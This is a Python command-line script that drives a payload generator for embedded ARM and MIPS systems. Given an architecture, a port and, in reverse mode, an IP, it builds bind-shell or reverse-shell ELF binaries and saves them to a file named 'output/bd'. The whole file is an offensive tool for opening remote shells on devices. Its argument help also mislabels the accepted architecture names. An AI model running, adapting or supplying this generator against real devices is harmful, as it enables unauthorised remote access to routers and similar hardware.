#!/usr/bin/env python

import argparse

from payloads.armle_reverse_tcp import armle_reverse_tcp
from payloads.mipsbe_reverse_tcp import mipsbe_reverse_tcp
from payloads.mipsle_reverse_tcp import mipsle_reverse_tcp
from payloads.armle_bind_tcp import armle_bind_tcp
from payloads.mipsle_bind_tcp import mipsle_bind_tcp
from payloads.mipsbe_bind_tcp import mipsbe_bind_tcp


def main():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('--arch', help='Architecture: mips, mipsel, arm', required=True)
    parser.add_argument('--tech', help='Technique: bind, reverse', required=True)
    parser.add_argument('--ip', help='IP address for reverse shell', required=False)
    parser.add_argument('--port', help='Port number for reverse shell', required=False)

    args = parser.parse_args()

    if args.tech == 'bind':
        if args.arch == 'armle':
            content = armle_bind_tcp(args.port).generate_elf()
        elif args.arch == 'mipsle':
            content = mipsle_bind_tcp(args.port).generate_elf()
        elif args.arch == 'mipsbe':
            content = mipsbe_bind_tcp(args.port).generate_elf()

    elif args.tech == 'reverse':
        if args.arch == 'armle':
            content = armle_reverse_tcp(args.ip, args.port).generate_elf()
        elif args.arch == 'mipsle':
            content = mipsle_reverse_tcp(args.ip, args.port).generate_elf()
        elif args.arch == 'mipsbe':
            content = mipsbe_reverse_tcp(args.ip, args.port).generate_elf()

    print(("Architecture: {}\n"
           "IP: {}\n"
           "Port: {}\n"
           "-----------------").format(args.arch, args.ip, args.port))

    path = "output/bd"

    print(("Length: {}\n"
           "Saving to: {}\n").format(len(content), path))

    with open(path, 'wb+') as f:
        f.write(content)
        f.close()


if __name__ == '__main__':
    main()
